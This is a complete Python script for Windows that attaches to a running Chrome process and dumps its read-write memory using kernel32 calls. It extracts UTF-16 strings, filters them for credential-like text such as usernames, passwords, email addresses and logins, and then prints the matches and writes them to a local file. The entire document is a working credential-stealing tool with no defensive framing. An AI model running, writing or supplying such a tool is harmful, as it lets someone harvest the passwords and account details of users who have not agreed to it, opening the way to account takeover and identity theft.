import ctypes
import psutil
import re
import os
from ctypes import wintypes
import time

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
CHROME_EXE = "chrome.exe"

# Windows API setup
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

OpenProcess = kernel32.OpenProcess
ReadProcessMemory = kernel32.ReadProcessMemory
VirtualQueryEx = kernel32.VirtualQueryEx
CloseHandle = kernel32.CloseHandle

MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('BaseAddress',       ctypes.c_void_p),
        ('AllocationBase',    ctypes.c_void_p),
        ('AllocationProtect', wintypes.DWORD),
        ('RegionSize',        ctypes.c_size_t),
        ('State',             wintypes.DWORD),
        ('Protect',           wintypes.DWORD),
        ('Type',              wintypes.DWORD),
    ]

def get_chrome_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == CHROME_EXE:
            return proc.info['pid']
    return None

def dump_memory(pid):
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        raise Exception("Could not open process. Try running as Administrator.")

    address = 0
    memory_dump = b""

    mbi = MEMORY_BASIC_INFORMATION()
    mbi_size = ctypes.sizeof(mbi)

    while VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), mbi_size):
        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_READWRITE:
            buffer = ctypes.create_string_buffer(mbi.RegionSize)
            bytesRead = ctypes.c_size_t(0)

            if ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
                memory_dump += buffer.raw[:bytesRead.value]

        address += mbi.RegionSize

    CloseHandle(process_handle)
    return memory_dump

def extract_utf16le_strings(data, min_length=6):
    pattern = re.compile((b'(?:[\x20-\x7E]\x00){%d,}' % min_length))
    return [match.decode('utf-16le') for match in pattern.findall(data)]

def save_to_file(strings, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        for s in strings:
            f.write(s + '\n')

def filter_creds(strings):
    possible_creds = []
    for s in strings:
        if any(x in s.lower() for x in ['username', 'password', '@', '.com', 'login']) and len(s) > 6:
            possible_creds.append(s)
    return possible_creds

def main():
    pid = get_chrome_pid()
    if not pid:
        print("[!] Chrome is not running.")
        return

    print(f"[+] Found Chrome PID: {pid}")
    print("[*] Taking memory dump...")
    dump = dump_memory(pid)
    print(f"[+] Memory dump completed. Size: {len(dump)} bytes")

    print("[*] Extracting UTF-16LE strings...")
    strings = extract_utf16le_strings(dump)
    print(f"[+] Found {len(strings)} strings.")

    print("[*] Filtering possible credentials...")
    creds = filter_creds(strings)

    if creds:
        print("[+] Possible credentials found:\n")
        for c in creds:
            print(f"    {c}")
    else:
        print("[-] No credential-like strings found.")

    save_to_file(creds, "possible_creds.txt")
    print("[*] Saved to possible_creds.txt")

if __name__ == "__main__":
    main()
